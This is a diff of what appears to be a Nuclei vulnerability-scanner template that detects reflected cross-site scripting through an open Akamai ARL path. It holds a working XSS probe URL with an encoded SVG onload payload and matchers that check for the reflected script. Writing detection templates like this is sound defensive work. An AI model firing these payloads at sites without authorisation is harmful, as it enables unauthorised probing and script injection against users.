@@ -2,7 +2,7 @@ id: akamai-arl-xss
 
 info:
   name: Open Akamai ARL - Cross-Site Scripting
-  author: pdteam,reewardius
+  author: pdteam
   severity: high
   description: Open Akamai ARL contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.
   reference:
@@ -15,28 +15,26 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
     cwe-id: CWE-79
-  tags: xss,akamai
   metadata:
-    max-request: 4
-    
+    max-request: 1
+  tags: akamai,xss,misconfig
+
 http:
   - method: GET
     path:
       - "{{BaseURL}}/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"
-      - "{{BaseURL}}/f/1/1/1/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E"
-      - "{{BaseURL}}/7/0/33/1d/http://brutelogic.com.br/2"
-      - "{{BaseURL}}/f/1/1/1/http://brutelogic.com.br/2"
-      
+
     matchers-condition: and
     matchers:
       - type: word
-        part: body
-        condition: or
+        condition: and
         words:
           - '"><svg onload=confirm(document.domain)>'
-          - 'alert(document.domain);'
-          
+          - 'Suggestions for improving the results'
+
       - type: word
         part: header
         words:
           - 'text/html'
+
+# digest: 4a0a0047304502206fd8ef39026affc4b4710769232b180cd8e14a7a99d559e853e35922323da94e022100d7e6f91ddbc0935b3cf3a89fef2dab5920b3061195b6574c641a81ccd7fb91d3:922c64590222798bb761d5b6d8e72950
